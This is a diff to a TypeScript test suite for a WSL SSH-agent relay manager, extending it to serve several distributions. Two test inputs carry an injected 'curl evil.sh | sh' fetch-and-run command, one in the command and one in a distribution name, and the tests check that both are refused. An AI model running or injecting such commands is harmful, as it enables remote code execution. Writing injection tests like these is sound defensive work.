@@ -1,6 +1,14 @@
 import assert from 'node:assert/strict';
 import { test } from 'node:test';
-import { RC_MARKER, isSafeShellWord, rcAlreadyHasIt, rcSnippet, relayArgv, socketFromExportLine } from '../wslRelay';
+import {
+  RC_MARKER,
+  isSafeShellWord,
+  parseDistros,
+  rcAlreadyHasIt,
+  rcSnippet,
+  relayArgv,
+  socketFromExportLine,
+} from '../wslRelay';
 import { MAX_QUICK_FAILURES, QUICK_FAILURE_MS, RelayProcess, WslRelayManager } from '../wslRelayManager';
 
 test('the relay runs through a login shell, because that is where PATH is', () => {
@@ -95,11 +103,11 @@ test('starting learns the socket from the relay itself', async () => {
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, () => undefined);
 
-  assert.deepEqual(manager.start('creds', ''), { ok: true });
-  assert.equal(manager.socketPath, '');
+  assert.deepEqual(manager.start('creds', ['']), { ok: true });
+  assert.equal(manager.socketPathFor(''), '');
   started[0].say('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock');
 
-  assert.equal(manager.socketPath, '/run/user/1000/creds-agent.sock');
+  assert.equal(manager.socketPathFor(''), '/run/user/1000/creds-agent.sock');
   manager.dispose();
 });
 
@@ -107,7 +115,7 @@ test('an unsafe command never reaches a shell', () => {
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, () => undefined);
 
-  const result = manager.start('creds; curl evil.sh | sh', '');
+  const result = manager.start('creds; curl evil.sh | sh', ['']);
 
   assert.equal(result.ok, false);
   assert.equal(started.length, 0, 'nothing was spawned');
@@ -116,13 +124,13 @@ test('an unsafe command never reaches a shell', () => {
 test('stopping kills the child and forgets where it was listening', async () => {
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, () => undefined);
-  manager.start('creds', '');
+  manager.start('creds', ['']);
   started[0].say('export SSH_AUTH_SOCK=/run/a.sock');
 
   manager.stop();
 
   assert.equal(started[0].killed, true);
-  assert.equal(manager.socketPath, '');
+  assert.equal(manager.socketPathFor(''), '');
   assert.equal(manager.running, false);
 });
 
@@ -131,7 +139,7 @@ test('a child killed by stop() does not come back when its exit lands', async ()
   // late resolution restarts a relay the caller has just turned off.
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, () => undefined);
-  manager.start('creds', '');
+  manager.start('creds', ['']);
 
   manager.stop();
   started[0].end(null);
@@ -144,7 +152,7 @@ test('a relay that dies on its own is restarted', async () => {
   let now = 0;
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, () => undefined, () => now);
-  manager.start('creds', '');
+  manager.start('creds', ['']);
 
   now += QUICK_FAILURE_MS * 10; // it ran for a while, then the distribution went away
   started[0].end(1);
@@ -161,7 +169,7 @@ test('a relay that cannot start is given up on rather than respawned forever', a
   const messages: string[] = [];
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, (m) => messages.push(m), () => now);
-  manager.start('creds', '');
+  manager.start('creds', ['']);
 
   for (let attempt = 0; attempt < MAX_QUICK_FAILURES; attempt += 1) {
     now += 10; // instantly
@@ -180,7 +188,7 @@ test('a run that lasted resets the patience', async () => {
   let now = 0;
   const { spawner, started } = fakes();
   const manager = new WslRelayManager(spawner, () => undefined, () => now);
-  manager.start('creds', '');
+  manager.start('creds', ['']);
 
   now += 10;
   started[0].end(1); // quick failure 1
@@ -194,4 +202,90 @@ test('a run that lasted resets the patience', async () => {
 
   assert.equal(started.length, 4, 'still trying, because the counter was reset');
   manager.dispose();
+});
+
+// --- more than one distribution (0.77.0) ----------------------------------------------------
+//
+// A socket lives inside one distribution's filesystem, so a relay in `Ubuntu` is invisible from
+// `Ubuntu-26.04`. Two distributions need two relays; the first version held one child and served
+// whichever WSL called default, which is a choice made for the person rather than by them.
+
+test('wsl -l -q is UTF-16, and reading it as UTF-8 finds nothing', () => {
+  // Measured: the bytes begin 55 00 62 00. Decoded as UTF-8 every name comes back interleaved
+  // with NULs and matches nothing — a failure that reads as "no distributions found".
+  const raw = Buffer.from('Ubuntu\r\ndocker-desktop\r\nUbuntu-26.04\r\n', 'utf16le');
+
+  assert.deepEqual(parseDistros(raw), ['Ubuntu', 'Ubuntu-26.04']);
+});
+
+test("Docker's own distributions are not offered, because they have no shell to configure", () => {
+  const raw = Buffer.from('docker-desktop\r\ndocker-desktop-data\r\n', 'utf16le');
+
+  assert.deepEqual(parseDistros(raw), []);
+});
+
+test('each chosen distribution gets its own relay, named on the command line', () => {
+  const { spawner, argv } = fakes();
+  const manager = new WslRelayManager(spawner, () => undefined);
+
+  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);
+
+  assert.equal(argv.length, 2);
+  assert.deepEqual(argv[0], ['-d', 'Ubuntu', '-e', 'bash', '-lc', 'exec creds relay']);
+  assert.deepEqual(argv[1], ['-d', 'Ubuntu-26.04', '-e', 'bash', '-lc', 'exec creds relay']);
+  assert.deepEqual(manager.serving(), ['Ubuntu', 'Ubuntu-26.04']);
+  manager.dispose();
+});
+
+test('their sockets are kept apart — one path per distribution', () => {
+  const { spawner, started } = fakes();
+  const manager = new WslRelayManager(spawner, () => undefined);
+  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);
+
+  started[0].say('export SSH_AUTH_SOCK=/run/user/1000/creds-agent.sock');
+  started[1].say('export SSH_AUTH_SOCK=/tmp/creds-agent-jinx.sock');
+
+  assert.equal(manager.socketPathFor('Ubuntu'), '/run/user/1000/creds-agent.sock');
+  assert.equal(manager.socketPathFor('Ubuntu-26.04'), '/tmp/creds-agent-jinx.sock');
+  manager.dispose();
+});
+
+test('a distribution without `creds` is given up on WITHOUT taking the others down', async () => {
+  // The likely reality: someone installs the CLI in the one they work in and not the other.
+  let now = 0;
+  const { spawner, started } = fakes();
+  const manager = new WslRelayManager(spawner, () => undefined, () => now);
+  manager.start('creds', ['Good', 'Broken']);
+  started[0].say('export SSH_AUTH_SOCK=/run/good.sock');
+
+  for (let attempt = 0; attempt < MAX_QUICK_FAILURES; attempt += 1) {
+    now += 10;
+    started[started.length - 1].end(127); // the newest is always the Broken respawn
+    await settled();
+  }
+
+  assert.equal(manager.socketPathFor('Good'), '/run/good.sock', 'the working one is untouched');
+  assert.ok(!manager.serving().includes('Broken'));
+  manager.dispose();
+});
+
+test('stopping takes every distribution down, not just the last one', () => {
+  const { spawner, started } = fakes();
+  const manager = new WslRelayManager(spawner, () => undefined);
+  manager.start('creds', ['Ubuntu', 'Ubuntu-26.04']);
+
+  manager.stop();
+
+  assert.deepEqual(started.map((s) => s.killed), [true, true]);
+  assert.equal(manager.running, false);
+});
+
+test('an unsafe distribution name never reaches a shell, and nothing starts', () => {
+  const { spawner, started } = fakes();
+  const manager = new WslRelayManager(spawner, () => undefined);
+
+  const result = manager.start('creds', ['Ubuntu', 'x; curl evil.sh | sh']);
+
+  assert.equal(result.ok, false);
+  assert.equal(started.length, 0, 'not even the safe one was spawned');
 });
